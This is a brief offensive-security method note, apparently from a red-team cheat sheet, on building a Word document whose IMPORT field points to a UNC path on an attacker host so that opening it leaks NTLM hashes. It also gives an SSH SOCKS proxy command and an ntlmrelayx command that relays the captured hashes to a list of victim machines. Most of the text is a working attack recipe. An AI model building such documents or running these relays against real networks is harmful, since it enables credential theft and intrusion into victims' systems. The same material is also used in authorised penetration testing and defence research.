# Method: Malicious Word Document
Create word document
```
# Open new word document
# Press 'CTRL + F9' to create empty field (special braces in word)
# Insert following code into the braces
IMPORT \\\\x.x.x.x\\anything\\sweetawesome.jpg
# Righ click and select 'Edit Field', select Data not stored with document
# Save document
```

Optional Step: Deploy Socks Proxy (if required to reach targets)
```
ssh -D 9050 root@x.x.x.x -N
```

Run ntlmrelayx to relay hashes (remove proxychains if not needed)
```
proxychains ntlmrelayx.py -tf victims.txt -smb2support --no-http-server
```

Research notes: Dive deeper into word fields. Appears the are other options such as INCLUDEPICTURE and INCLUDETEXT
